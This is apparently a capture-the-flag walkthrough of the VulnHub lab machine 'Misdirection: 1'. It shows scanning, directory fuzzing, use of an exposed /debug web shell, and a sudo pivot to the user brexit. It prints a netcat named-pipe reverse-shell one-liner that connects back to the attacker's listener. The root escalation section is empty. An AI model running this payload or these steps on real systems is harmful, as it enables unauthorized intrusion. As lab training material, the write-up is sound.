# MISDIRECTION: 1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.133	00:0c:29:b7:d5:da	VMware, Inc.
192.168.127.254	00:50:56:e7:2f:f3	VMware, Inc.
```

The IP address is `192.168.127.133`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -p22,80,3306,8080 -sV -sC -v -oN nmap.out 192.168.127.133

Nmap scan report for 192.168.127.133
Host is up (0.00032s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 00:0C:29:B7:D5:DA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i started checking port `80` and at this page there was nothing interesting, a login page and sign up whcih did not work for registring a user or

using SQLi :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f5fd7c46-edbf-40a6-a984-a401b26e8f7e)

i did fuzzing and found nothing good to work on.

then i turned my attention on port 8080 and started fuzzing it, i found `/wrodpress` on this port which was another misdirection and had nothing

no user, no vulnerable plugin or anything (just a rabbit hole)

```bash
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.133:8080/FUZZ

images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 6ms]
help                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 9ms]
scripts                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 2ms]
css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 3ms]
wordpress               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 2ms]
development             [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 5ms]
manual                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 2ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 3ms]
shell                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 7ms]
debug                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 4ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4ms]
server-status           [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 2ms]
```

i checked all the directories found by fuzzing untill i reached `/debug` :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/63020c17-85d5-4451-a790-1ed081891850)

this is a virtual shell on web, which we can insert any command on it, why not  a reverse shell ?


## 3.Gaining Shell


So just use this payload and start a listener on your machine :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.127.128 4444 >/tmp/f
```

```bash
root@kali: nc -nvlp 4444

nc -nvlp 5555 
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.133] 58766
/bin/sh: 0: can't access tty; job control turned off

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

## 4.Privilege Escalation (brexit)

Check for sudo permissions :

```bash
$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

and yes we can now escalate to `brexit`:

```bash
$ sudo -u brexit /bin/bash
id
uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
```

## 5.Privilege Escalation (root)











